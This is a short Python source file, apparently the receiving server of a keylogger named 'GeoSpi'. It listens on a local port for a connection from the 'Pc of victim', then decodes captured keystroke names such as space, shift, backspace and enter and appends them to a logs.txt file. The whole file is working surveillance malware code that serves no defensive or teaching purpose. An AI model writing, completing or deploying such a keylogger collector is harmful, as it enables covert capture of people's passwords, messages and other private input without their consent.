import socket as s


class Server:
    def __init__(self):
        # Set var
        self.host = "localhost"
        self.port = 8080
        self.server = s.socket()

        # Bind ip and port to the socket
        self.server.bind((self.host, self.port))
        # Start the server
        self.set_server()

    def tras_data(self, data, file):
        """
        This function clear the data reviced from server
        """
        if data == "Key.space":
            return " "
        elif data == "Key.shift":
            return "[S]>"
        elif data == "Key.backspace":
            return "<[D]"
        elif data == "Key.ctrl":
            return ">[CT]"
        elif data == "Key.caps_lock":
            return ">[CL]"
        elif data == "Key.shift_r":
            return "[TB]"
        elif data == "Key.enter":
            return "\n"
        data = data.removeprefix("'")
        data = data.removesuffix("'")
        return data

    def set_server(self):
        """
        This function start server and start listen message from client
        """
        print(f"<{'-' * 10} Server online!{'-' * 10}>")
        self.server.listen()
        print(f"<{'-' * 10} Server in listening{'-' * 10}>")
        conn, add = self.server.accept()
        file = open("logs.txt", "a")
        i = True
        print(f"<{'-' * 10}Pc of victim found, GeoSpi in communication...\nInfo: {add}{'-' * 10}>")
        with file:
            with conn:
                while True:
                    data = conn.recv(1024)
                    data = data.decode()
                    if not data:
                        print(f"{'-' * 10}Error in data, maybe client stop the connexion{'-' * 10}")
                        self.set_server()
                        break
                    if i:
                        file.write(f"{data}\n")
                        i = False
                    else:
                        file.write(self.tras_data(data, file))


if __name__ == "__main__":
    Server()
